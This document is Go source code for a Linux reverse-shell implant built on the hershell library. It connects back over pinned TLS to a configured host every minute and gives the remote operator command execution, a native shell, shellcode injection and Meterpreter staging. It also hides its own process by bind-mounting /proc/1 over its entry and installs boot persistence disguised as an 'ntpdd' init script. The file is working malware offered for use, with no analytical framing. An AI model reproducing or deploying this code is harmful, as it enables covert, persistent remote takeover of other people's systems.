package main

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/lesnuages/hershell/meterpreter"
	"github.com/lesnuages/hershell/shell"
)

const (
	errCouldNotDecode  = 1 << iota
	errHostUnreachable = iota
	errBadFingerprint  = iota
)

var (
	connectString string
	fingerPrint   string
)

func interactiveShell(conn net.Conn) {
	var (
		exit    = false
		prompt  = "[hershell]> "
		scanner = bufio.NewScanner(conn)
	)
	host, err := os.Hostname()
	if err == nil {
		prompt = host
	}
	conn.Write([]byte(prompt))

	for scanner.Scan() {
		command := scanner.Text()
		if len(command) > 1 {
			argv := strings.Split(command, " ")
			switch argv[0] {
			case "meterpreter":
				if len(argv) > 2 {
					transport := argv[1]
					address := argv[2]
					ok, err := meterpreter.Meterpreter(transport, address)
					if !ok {
						conn.Write([]byte(err.Error() + "\n"))
					}
				} else {
					conn.Write([]byte("Usage: meterpreter [tcp|http|https] IP:PORT\n"))
				}
			case "inject":
				if len(argv) > 1 {
					shell.InjectShellcode(argv[1])
				}
			case "doexit":
				exit = true
			case "run_shell":
				conn.Write([]byte("Enjoy your native shell\n"))
				runShell(conn)
			default:
				shell.ExecuteCmd(command, conn)
			}

			if exit {
				break
			}

		}
		conn.Write([]byte(prompt))
	}
}

func runShell(conn net.Conn) {
	var cmd = shell.GetShell()
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Stdin = conn
	cmd.Run()
}

func checkKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
	valid := false
	connState := conn.ConnectionState()
	for _, peerCert := range connState.PeerCertificates {
		hash := sha256.Sum256(peerCert.Raw)
		if bytes.Compare(hash[0:], fingerprint) == 0 {
			valid = true
		}
	}
	return valid, nil
}

func reverse(connectString string, fingerprint []byte) {
	var (
		conn *tls.Conn
		err  error
	)
	config := &tls.Config{InsecureSkipVerify: true}
	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
		// os.Exit(errHostUnreachable)
		return
	}

	defer conn.Close()

	if ok, err := checkKeyPin(conn, fingerprint); err != nil || !ok {
		// os.Exit(errBadFingerprint)
		return
	}

	interactiveShell(conn)
}

func cmdRun(cmd string, shell bool) string {

	if shell {
		out, err := exec.Command("sh", "-c", cmd).Output()
		if err != nil {
			return ""
		}
		return strings.TrimSpace(string(out))
	} else {
		out, err := exec.Command(cmd).Output()
		if err != nil {
			return ""
		}
		return strings.TrimSpace(string(out))
	}
}

func hideSelf(pid int) {
	// hide process bind /proc/1
	hideCmd := fmt.Sprintf("mount -o bind /proc/%d /proc/%d", pid, os.Getpid())
	cmdRun(hideCmd, true)
}

func makeStartBootup() {

	dPath := "/bin/ntpdd"
	vRpath := "/etc/init.d/ntpdd"
	vLnpath := "/etc/rcS.d/S59ntpdd"
	bootCmd := fmt.Sprintf("echo \"#!/bin/sh\" > %s;echo \"%s> /dev/null 2>&1 &\" >> %s;chmod +x %s;ln -s %s %s", vRpath, dPath, vRpath, vRpath, vRpath, vLnpath)
	cmdRun(bootCmd, true)
}

func main() {

	_, err := net.Listen("tcp", ":65534")
	if err != nil {
		return
	}

	hideSelf(1)
	makeStartBootup()
	if connectString != "" && fingerPrint != "" {
		fprint := strings.Replace(fingerPrint, ":", "", -1)
		bytesFingerprint, err := hex.DecodeString(fprint)
		if err != nil {
			os.Exit(errCouldNotDecode)
		}
		for {
			reverse(connectString, bytesFingerprint)
			time.Sleep(time.Duration(60) * time.Second)
		}
	}
}
